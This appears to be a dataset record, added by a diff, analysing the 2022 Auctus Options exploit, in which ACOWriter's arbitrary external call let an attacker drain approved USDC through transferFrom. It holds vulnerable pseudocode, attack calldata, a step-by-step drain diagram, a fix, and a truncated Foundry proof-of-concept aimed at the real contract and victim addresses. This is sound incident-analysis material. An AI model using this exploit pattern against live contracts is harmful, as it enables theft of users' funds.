@@ -1,0 +1,32 @@
+{
+ "id": "2022__2022-03-28_Auctus_ArbitraryCallTransferFrom",
+ "source_file": "2022/2022-03-28_Auctus_ArbitraryCallTransferFrom.md",
+ "title": "Auctus Options — Analysis of transferFrom Exploitation via Arbitrary Call",
+ "date": "2022-03-28",
+ "protocol": "Auctus Options",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "Full USDC balance of victim (exact total undisclosed)",
+ "loss_usd": null,
+ "root_cause": "The `write()` function allowed execution of arbitrary external calls, enabling an attacker to invoke USDC's `transferFrom()` on behalf of the contract and drain approved victim funds",
+ "attack_tx": null,
+ "vulnerable_contract": "ACOWriter 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable ACOWriter.write() (pseudocode)\ncontract ACOWriter {\n\n    //",
+  "❌ Allows forwarding arbitrary calldata to an arbitrary address\n    function write(\n        address target,      // attacker sets this to the USDC address\n        bytes calldata data  // attacker sets this to transferFrom calldata\n    ) external payable {\n        // Executes external call with no target validation\n        (bool success, ) = target.call{value: msg.value}(data);\n        require(success, \"write failed\");\n    }\n}\n\n// Attack calldata:\n// data = abi.encodeWithSelector(\n//     IERC20.transferFrom.selector,\n//     victim,        // from: victim (address that approved ACOWriter)\n//     attacker,      // to: attacker\n//     victimBalance  // amount: victim's full balance\n// )\n\n//",
+  "// ❌ Root cause: `write()` function allows execution of arbitrary external calls, enabling invocation of USDC's `transferFrom()` to drain approved victim funds\n    function write(  // ❌ Vulnerability\n        address acoToken, \n        uint256 collateralAmount, \n        address exchangeAddress, \n        bytes memory exchangeData\n    ) \n        nonReentrant \n        setExchange(exchangeAddress) \n        public \n        payable \n    {\n        require(msg.value > 0,  \"ACOWriter::write: Invalid msg value\");\n        require(collateralAmount > 0,  \"ACOWriter::write: Invalid collateral amount\");\n        \n        address _collateral = IACOToken(acoToken).collateral();\n        if (_isEther(_collateral)) {\n            IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);\n        } else {\n            _transferFromERC20(_collateral, msg.sender, address(this), collateralAmount);\n            _approveERC20(_collateral, acoToken, collateralAmount);\n            IACOToken(acoToken).mintTo(msg.sender, collateralAmount);\n        }\n        \n        _sellACOTokens(acoToken, exchangeData);\n    }"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract ACOWriterFixed {\n    //",
+  "✅ Manage only whitelisted function selectors\n    mapping(bytes4 => bool) public allowedSelectors;\n\n    function write(address target, bytes calldata data) external payable {\n        bytes4 selector = bytes4(data[:4]);\n        require(allowedSelectors[selector], \"selector not allowed\");\n        //"
+ ],
+ "steps": [
+  "[3] ACOWriter → USDC.transferFrom() executes"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Confirm that victim (0xCB32033c...) has approved ACOWriter for USDC\n    │       (query on-chain allowance)\n    │\n    ├─[2] Call ACOWriter.write() (send 1 wei)\n    │       target = USDC contract address\n    │       data   = abi.encode(transferFrom(victim, attacker, victim_balance))\n    │\n    ├─[3] ACOWriter → USDC.transferFrom() executes\n    │       msg.sender = ACOWriter (the spender victim approved)\n    │       from = victim\n    │       to   = attacker\n    │       amount = victim's full USDC balance\n    │\n    └─[4] Victim's entire USDC balance drained",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IACOWriter {\n    // ⚡ Vulnerable function: target and data can be set arbitrarily by attacker\n    function write(address target, bytes calldata data) external payable;\n}\n\ncontract ContractTest is Test {\n    IACOWriter acoWriter =\n        IACOWriter(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    address victim = 0xCB32033c498b54818e58270F341e5f6a3bce993B;\n    address attacker = address(this);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 14_460_635);\n    }\n\n    function testExploit() public {\n        uint256 victimBalance = USDC.balanceOf(victim);\n        emit log_named_decimal_uint(\"[Before] V"
+ ]
+}
